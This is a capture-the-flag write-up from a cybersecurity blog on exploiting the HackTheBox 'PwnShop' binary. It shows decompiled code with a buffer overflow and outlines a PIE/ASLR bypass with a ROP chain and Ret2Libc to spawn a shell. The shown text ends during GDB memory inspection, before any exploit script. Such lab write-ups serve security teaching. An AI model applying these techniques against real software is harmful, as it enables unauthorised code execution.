<!doctype html><html lang="es"><head><title>PwnShop | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="64-bit binary. Buffer Overflow. PIE and ASLR bypass. Special ROP chain. Ret2Libc"><meta itemprop="description" content="64-bit binary. Buffer Overflow. PIE and ASLR bypass. Special ROP chain. Ret2Libc"><meta name="twitter:card" content="64-bit binary. Buffer Overflow. PIE and ASLR bypass. Special ROP chain. Ret2Libc"><meta name="twitter:description" content="64-bit binary. Buffer Overflow. PIE and ASLR bypass. Special ROP chain. Ret2Libc"><meta property="og:description" content="64-bit binary. Buffer Overflow. PIE and ASLR bypass. Special ROP chain. Ret2Libc"><meta property="og:type" content="website"><meta name="robots" content="index, follow"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta itemprop="name" content="PwnShop"><meta property="twitter:title" content="PwnShop"><meta property="og:title" content="PwnShop"><meta property="og:url" content="https://7rocky.github.io/en/ctf/htb-challenges/pwn/pwnshop/"><meta itemprop="keywords" content><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/monokai-sublime.min.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/highlight.min.js"></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/ctf/htb-challenges/pwn/pwnshop/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px"></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- PWN</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/htb-challenges/pwn/pwnshop/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/pwnshop/&text=PwnShop" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/pwnshop/&title=PwnShop" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">PwnShop</h1><p class="mb4 f6 dib tracked">14 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#buffer-overflow-vulnerability">Buffer Overflow vulnerability</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#pie-bypass">PIE bypass</a></li><li><a href="#crafting-the-rop-chain">Crafting the ROP chain</a></li><li><a href="#leaking-memory-addresses">Leaking memory addresses</a></li><li><a href="#getting-rce">Getting RCE</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given a 64-bit binary called <code>pwnshop</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little  
RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
Stack:    <span class="code-dark-red">No canary found</span>
NX:       <span class="code-dark-green">NX enabled</span>
PIE:      <span class="code-dark-green">PIE enabled</span>
</code></pre></div><h2 id="reverse-engineering">Reverse engineering</h2><p>We can use Ghidra to analyze the binary and look at the decompiled source code in C:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">undefined[</span><span class="mtk6">16</span><span class="mtk1">] </span><span class="mtk8">main</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> option_char;</span>
<span class="mtk1">  ulong in_RCX;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> option;</span>
<span class="mtk1">  </span>
<span class="mtk1">  </span><span class="mtk8">setup</span><span class="mtk1">();</span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"========= HTB PwnShop ==========="</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"What do you wanna do?"</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"1&gt; Buy</span><span class="mtk6">\n</span><span class="mtk4">2&gt; Sell</span><span class="mtk6">\n</span><span class="mtk4">3&gt; Exit</span><span class="mtk6">\n</span><span class="mtk4">&gt; "</span><span class="mtk1">);</span>  
<span class="mtk1">      option_char </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">getchar</span><span class="mtk1">();</span>
<span class="mtk1">      </span><span class="mtk8">getchar</span><span class="mtk1">();</span>
<span class="mtk1">      option </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">char</span><span class="mtk1">) option_char;</span>
<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk4">'2'</span><span class="mtk1">) </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">      </span><span class="mtk8">sell</span><span class="mtk1">();</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'3'</span><span class="mtk1">) </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'1'</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk8">buy</span><span class="mtk1">();</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Please try again."</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">ZEXT816</span><span class="mtk1">(in_RCX) </span><span class="mtk5">&lt;&lt;</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">40</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>The first option is <code>buy</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">buy</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> details[</span><span class="mtk6">72</span><span class="mtk1">];</span>

<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Sorry, we aren</span><span class="mtk6">\'</span><span class="mtk4">t selling right now."</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"But you can place a request. </span><span class="mtk6">\n</span><span class="mtk4">Enter details: "</span><span class="mtk1">);</span>  
<span class="mtk1">  </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, details, </span><span class="mtk6">80</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><p>And this is the second option, <code>sell</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">sell</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> res;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> i;</span>
<span class="mtk1">  byte zero;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> item[</span><span class="mtk6">32</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> price[</span><span class="mtk6">8</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">details;</span>
<span class="mtk1">  undefined4 </span><span class="mtk5">*</span><span class="mtk1">pointer;</span>

<span class="mtk1">  zero </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  details </span><span class="mtk5">=</span><span class="mtk1"> details_global;</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"What do you wish to sell? "</span><span class="mtk1">);</span>
<span class="mtk1">  price </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">char</span><span class="mtk1">[</span><span class="mtk6">8</span><span class="mtk1">]) </span><span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  pointer </span><span class="mtk5">=</span><span class="mtk1"> (undefined4 </span><span class="mtk5">*</span><span class="mtk1">) item;</span>

<span class="mtk1">  </span><span class="mtk5">for</span><span class="mtk1"> (i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">; i </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; i</span><span class="mtk5">--</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">*</span><span class="mtk1">pointer </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">    pointer </span><span class="mtk5">=</span><span class="mtk1"> pointer </span><span class="mtk5">+</span><span class="mtk1"> (ulong) zero </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">2</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, item, </span><span class="mtk6">31</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"How much do you want for it? "</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, price, </span><span class="mtk6">8</span><span class="mtk1">);</span>
<span class="mtk1">  res </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strcmp</span><span class="mtk1">(price, </span><span class="mtk4">"13.37</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (res </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Sounds good. Leave details here so I can ask my g</span><span class="mtk4">uy to take a look."</span><span class="mtk1">);</span>  
<span class="mtk1">    pointer </span><span class="mtk5">=</span><span class="mtk1"> (undefined4 </span><span class="mtk5">*</span><span class="mtk1">) details;</span>

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> (i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1">; i </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; i</span><span class="mtk5">--</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk5">*</span><span class="mtk1">pointer </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">      pointer </span><span class="mtk5">=</span><span class="mtk1"> pointer </span><span class="mtk5">+</span><span class="mtk1"> (ulong) zero </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">2</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, details, </span><span class="mtk6">64</span><span class="mtk1">);</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"What? </span><span class="mtk6">%s</span><span class="mtk4">? The best I can do is 13.37$</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, price);</span>
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><p>Here, we have the chance to write data into <code>details_global</code> (a global variable). For this, we need to enter <code>"13.37\n"</code> as <code>price</code>. Moreover, if <code>price</code> is not equal to <code>"13.37\n"</code>, it is printed out.</p><h3 id="buffer-overflow-vulnerability">Buffer Overflow vulnerability</h3><p>The binary is vulnerable to Buffer Overflow in <code>buy</code> since there is a variable called <code>data</code> that has 72 bytes assigned as buffer, but the program is reading up to 80 bytes from <code>stdin</code> and storing the data into <code>data</code>, overflowing the reserved buffer if the size of the input data is greater than 72 bytes.</p><p>Due to the fact that it is a 64-bit binary without canary protection, after the reserved buffer of 72 bytes, we find the saved value of <code>$rbp</code>, and right after, the saved return address. Fortunately, this time there is no saved <code>$rbp</code>, so we will be overwriting the return address. We can see this looking at the assembly code:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">objdump</span> -M intel -j .text -d <span class="mtku">pwnshop</span>

pwnshop:     file format elf64-x86-64


Disassembly of section .text:

00000000000010a0 &lt;.text&gt;:
    10a0:       55                      push   rbp
    10a1:       31 c0                   xor    eax,eax
    10a3:       48 8d 2d 79 10 00 00    lea    rbp,[rip+0x1079]        # 2123 &lt;setvbuf@plt+0x1093&gt;  

    ...

    132a:       48 83 ec 48             sub    rsp,0x48
    132e:       48 8d 3d 7a 0d 00 00    lea    rdi,[rip+0xd7a]        # 20af &lt;setvbuf@plt+0x101f&gt;
    1335:       e8 f6 fc ff ff          call   1030 &lt;puts@plt&gt;
    133a:       48 8d 3d 92 0d 00 00    lea    rdi,[rip+0xd92]        # 20d3 &lt;setvbuf@plt+0x1043&gt;
    1341:       31 c0                   xor    eax,eax
    1343:       e8 f8 fc ff ff          call   1040 &lt;printf@plt&gt;
    1348:       48 89 e6                mov    rsi,rsp
    134b:       ba 50 00 00 00          mov    edx,0x50
    1350:       31 ff                   xor    edi,edi
    1352:       e8 09 fd ff ff          call   1060 &lt;read@plt&gt;
    1357:       48 83 c4 48             add    rsp,0x48
    135b:       c3                      ret

    ...

    13c5:       66 66 2e 0f 1f 84 00    data16 nop WORD PTR cs:[rax+rax*1+0x0]
    13cc:       00 00 00 00
    13d0:       f3 0f 1e fa             endbr64
    13d4:       c3                      ret
</code></pre></div><p>As can be seen, there is <code>sub rsp, 0x48</code>, then the program reads up to <code>0x50</code> bytes, and at the end it reverts the stack using <code>add rsp,0x48</code>. Since there is no <code>leave; ret</code> instruction, <code>$rbp</code> is not taken into account, just the saved return address.</p><h2 id="exploit-strategy">Exploit strategy</h2><p>Since the binary has NX protection, we must use Return Oriented Programming (ROP) to execute arbitrary code. This technique makes use of gadgets, which are sets of instructions that end in <code>ret</code> (usually). We can add a list of addresses for gadgets on the stack so that when a gadget is executed, it returns to the stack and executes the next gadget. That is the meaning of ROP chain.</p><p>This is a bypass for NX protection since we are not executing instructions in the stack (shellcode), but we are redirecting the program to specific addresses that are executable and run the instructions we want.</p><p>In order to gain code execution, we will perform a Ret2Libc attack. This technique consists of calling <code>system</code> inside Glibc using <code>"/bin/sh"</code> as first parameter to the function (which is also inside Glibc). The problem we must handle is ASLR, which is a protection set for shared libraries that randomize a base address.</p><p>Since we want to call <code>system</code> and take <code>"/bin/sh"</code>, we need to know the addresses of those values inside Glibc at runtime (these addresses will change in every execution). Hence, we must find a way to leak an address inside Glibc because the only thing that is random is the base address of Glibc; the rest of the addresses are computed as offsets to that base address.</p><p>Since the binary has PIE enabled, we need to leak an address of the binary at runtime and compute the base address using offsets.</p><p>The process of leaking a function comes with calling <code>puts</code> using an address from the Global Offset Table (GOT) as first argument (for example, <code>setvbuf</code>). This table contains the real addresses of the external functions used by the program (if they have been resolved). Since <code>puts</code> is used by the binary, to call it we can use the Procedure Linkage Table (PLT), which applies a jump instruction to the real address of <code>puts</code>.</p><p>One more thing to consider is the use of gadgets. Because of the calling conventions for 64-bit binaries, when calling a function, the arguments must be stored in registers (in order: <code>$rdi</code>, <code>$rsi</code>, <code>$rdx</code>, <code>$rcx</code>&mldr;). For example, the instruction <code>pop rdi</code> will take the next value from the stack and store it in <code>$rdi</code>.</p><h2 id="exploit-development">Exploit development</h2><p>Nice, let&rsquo;s start with the leakage process. First of all, let&rsquo;s leak an address of the binary. The best is to run GDB and take a look at <code>price</code> before writing, so let&rsquo;s inpsect the address:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">pwnshop</span>
Reading symbols from <span class="code-dark-green">pwnshop</span>...
(No debugging symbols found in <span class="code-dark-green">pwnshop</span>)
<span class="code-red">gef➤  </span>run
Starting program: ./pwnshop
========= HTB PwnShop ===========
What do you wanna do?
1&gt; Buy
2&gt; Sell
3&gt; Exit
&gt; 2
What do you wish to sell? asdf
How much do you want for it? ^C
Program received signal SIGINT, Interrupt.
<span class="code-dark-blue">0x00007ffff7ecafd2</span> in <span class="code-dark-yellow">__GI___libc_read</span> (<span class="code-dark-cyan">fd</span>=0x0, <span class="code-dark-cyan">buf</span>=0x7fffffffe640, <span class="code-dark-cyan">nbytes</span>=0x8) at <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>:26  
26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
</code></pre></div><p>The address of <code>item</code> is in <code>$rsi</code> (the second argument of <code>read</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>grep asdf
<span class="code-blue">[+]</span> Searching '<span class="code-dark-yellow">asdf</span>' in memory
<span class="code-green">[+]</span> In '<span class="code-dark-blue">[stack]</span>'(0x7ffffffde000-0x7ffffffff000), permission=rw-  
  0x7fffffffe620 - 0x7fffffffe626  →   "<span class="code-dark-magenta">asdf\n</span>"
<span class="code-green">gef➤  </span>x/20gx 0x7fffffffe620
<span class="code-dark-blue">0x7fffffffe620</span>: 0x0000000a66647361      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe630</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe640</span>: 0x0000000000000000      0x00005555555580c0
<span class="code-dark-blue">0x7fffffffe650</span>: 0x0000000000000032      0x0000000000000032
<span class="code-dark-blue">0x7fffffffe660</span>: 0x0000555555556123      0x00005555555550fe
<span class="code-dark-blue">0x7fffffffe670</span>: 0x0000555555555360      0x0000555555555360
<span class="code-dark-blue">0x7fffffffe680</span>: 0x0000000000000000      0x00007ffff7de1083
